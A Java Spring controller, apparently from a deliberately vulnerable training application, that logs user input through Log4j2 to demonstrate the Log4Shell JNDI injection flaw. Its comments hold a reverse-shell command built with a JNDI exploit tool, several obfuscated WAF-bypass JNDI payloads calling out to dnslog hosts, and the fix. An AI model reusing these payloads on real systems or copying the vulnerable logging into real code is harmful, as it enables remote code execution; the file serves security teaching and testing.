package com.best.hello.controller.ComponentsVul;

import io.swagger.annotations.Api;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;


@Api("Log4j2 反序列化漏洞")
@RestController
@RequestMapping("/Log4j")
public class Log4jVul {

    private static final Logger logger = LogManager.getLogger(Log4jVul.class);

    /**
     * 原理：一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。
     * 反弹shell: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,str_base64}|{base64,-d}|{bash,-i}" -A IP
     *
     * bypass waf
     * content=${jndi:rmi://rmi.44qbby.dnslog.cn/a}
     * content=${${::-j}ndi:rmi://mi.44qbby.dnslog.cn/ass}
     * content=${${::-j}ndi:ldap://haha.44qbby.dnslog.cn/ass}
     * content=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://nono1.44qbby.dnslog.cn/ass}
     * content=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://nono2.44qbby.dnslog.cn/ass}
     *
     * 修复：log4j2.formatMsgNoLookups=True，dnslog也就无回显了
     */
    @PostMapping(value = "/vul")
    public String vul(@RequestParam("q") String q) {
        // ${jndi:ldap://lala.pvs999.ceye.io/test}
        System.out.println(q);
        logger.error(q);
        return "Log4j2 JNDI Injection";
    }

}
